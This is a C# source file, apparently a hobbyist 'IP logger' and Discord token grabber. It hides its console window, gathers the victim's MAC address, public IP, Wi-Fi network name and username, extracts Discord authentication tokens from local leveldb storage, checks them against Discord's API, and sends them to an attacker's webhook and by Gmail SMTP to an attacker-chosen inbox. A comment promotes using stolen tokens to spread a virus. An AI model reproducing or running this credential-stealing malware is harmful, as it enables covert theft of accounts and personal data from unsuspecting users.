using System;
using System.Runtime.InteropServices;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Mail;
using Microsoft.WindowsAPICodePack.Net;
using System.IO;
using System.Text.RegularExpressions;
using System.Net.Http;

namespace iplogger
{
    class Program
    {
        public static void Main(string[] args)
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                [DllImport("kernel32.dll")] //import dll
                static extern IntPtr GetConsoleWindow();
                [DllImport("user32.dll")] //import dll
                static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
                const int SW_HIDE = 0;
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE); //hide window
                string sConnected;
                string user = Environment.UserName;
                var networks = NetworkListManager.GetNetworks(NetworkConnectivityLevels.Connected);
                foreach (var network in networks)
                {
                    sConnected = (network.IsConnected == true) ? " (connected)" : " (disconnected)";
                    Console.WriteLine("Network : " + network.Name + " - Category : " + network.Category.ToString() + sConnected);
                    var mac = string.Join(":", nic.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2"))); //gets mac address and writes it into a variable
                    string publicip = new WebClient().DownloadString("http://icanhazip.com"); //gets the public ip and writes it into a string
                    Console.WriteLine(mac);
                    Console.WriteLine(publicip);
                    bool discordgrabber = true; //true = activate token grabber, false = disable token grabber
                    if (discordgrabber == true)
                    {
                        static bool CheckToken(string token)
                        {
                            try
                            {
                                var http = new WebClient();
                                http.Headers.Add("Authorization", token);
                                var result = http.DownloadString("https://discordapp.com/api/v6/users/@me");
                                if (!result.Contains("Unauthorized"))
                                {
                                    return true;
                                }
                                else
                                {
                                    return false;
                                }
                            }
                            catch
                            {
                                return false;
                            }
                        }

                        string Webhook = ""; //insert your discord webhook

                        string appdata = Environment.GetEnvironmentVariable("APPDATA");
                        string[] directories = Directory.GetDirectories(appdata);

                        foreach (var path in directories)
                        {
                            if (path.Contains("discord"))
                            {

                                string[] local = Directory.GetDirectories(path);
                                foreach (var path1 in local)
                                {
                                    if (path1.Contains("Local Storage"))
                                    {
                                        string[] ldb = Directory.GetFiles(path1 + "\\leveldb");

                                        foreach (var ldb_file in ldb)
                                        {
                                            if (ldb_file.EndsWith(".ldb"))
                                            {
                                                var text = System.IO.File.ReadAllText(ldb_file);
                                                string token_reg = @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
                                                Match token = Regex.Match(text, token_reg);
                                                if (token.Success)
                                                {
                                                    if (CheckToken(token.Value))
                                                    {
                                                        HttpClient Http = new HttpClient();
                                                        MultipartFormDataContent Payload = new MultipartFormDataContent();
                                                        Payload.Add(new StringContent(Environment.UserName), "username");
                                                        Payload.Add(new StringContent(string.Concat(new string[] {
                                                        "```asciidoc\n" +
                                                        "\n• token :: ", token.Value + "```"}
                                                        )), "content");
                                                        Http.PostAsync(Webhook, Payload);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    var fromAddress = new MailAddress("from@gmail.com", $"From Logger: {publicip}"); //change from@gmail.com to the sender email (create an email and set lesssecureapps on)
                    var toAddress = new MailAddress("to@gmail.com", "To Echo"); //change to@gmail.com to the reciever email (set lesssecureapps on)
                    var fromPassword = "senderpassword"; //change senderpassword to the password of the sender
                    var smtp = new SmtpClient
                    {
                        Host = "smtp.gmail.com",
                        Port = 587,
                        EnableSsl = true,
                        DeliveryMethod = SmtpDeliveryMethod.Network,
                        UseDefaultCredentials = false,
                        Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
                    };
                    using (var message = new MailMessage(fromAddress, toAddress)
                    {
                        Subject = "logs from the logger"
                        ,
                        Body = $"Mac Address: {mac} Ip Address: {publicip} Connected wifi ssid: {network.Name} Username: {user} Discord Token: {discordgrabber} You know you can use the token to activate a virus on the target account? check out my BrainZ repo! https://github.com/NullByte75/BrainZ"
                    })
                    {
                        smtp.Send(message);
                    }

                }
                break;
            }
        }
    }
}
